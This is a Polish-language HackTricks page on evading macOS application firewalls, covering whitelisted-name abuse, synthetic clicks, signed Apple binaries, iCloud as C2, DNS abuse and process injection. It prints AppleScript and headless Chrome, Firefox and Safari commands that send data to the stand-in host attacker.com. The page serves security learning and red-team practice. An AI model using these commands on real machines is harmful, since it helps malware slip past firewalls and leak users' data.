# Bypassowanie zapór sieciowych w macOS

{% hint style="success" %}
Dowiedz się i ćwicz Hacking AWS: <img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Dowiedz się i ćwicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na githubie.

</details>
{% endhint %}

## Znalezione techniki

Poniższe techniki zostały znalezione działające w niektórych aplikacjach zapór sieciowych macOS.

### Nadużywanie nazw na białej liście

* Na przykład nazywanie złośliwego oprogramowania nazwami znanych procesów macOS, takich jak **`launchd`**

### Kliknięcie syntetyczne

* Jeśli zapora prosi użytkownika o zgodę, złośliwe oprogramowanie może **kliknąć na zezwolenie**

### **Używanie podpisanych binariów Apple**

* Takich jak **`curl`**, ale także innych, takich jak **`whois`**

### Znane domeny Apple

Zapora może zezwalać na połączenia do znanych domen Apple, takich jak **`apple.com`** lub **`icloud.com`**. A iCloud może być używane jako C2.

### Ogólne Bypassowanie

Kilka pomysłów na próbę obejścia zapór sieciowych

### Sprawdź dozwolony ruch

Znajomość dozwolonego ruchu pomoże Ci zidentyfikować potencjalnie na białej liście domeny lub aplikacje, które mają do nich dostęp.
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### Nadużywanie DNS

Rozdzielczość DNS jest wykonywana za pomocą podpisanego aplikacji **`mdnsreponder`**, która prawdopodobnie będzie miała zezwolenie na kontakt z serwerami DNS.

<figure><img src="../../.gitbook/assets/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>

### Przez aplikacje przeglądarki

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* Google Chrome

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* Firefox
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
* Safari
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### Poprzez wstrzykiwanie procesów

Jeśli możesz **wstrzyknąć kod do procesu**, który ma zezwolenie na połączenie z dowolnym serwerem, możesz ominąć zabezpieczenia zapory ogniowej:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## Referencje

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

{% hint style="success" %}
Naucz się i praktykuj Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Naucz się i praktykuj Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wesprzyj HackTricks</summary>

* Sprawdź [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel się trikami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
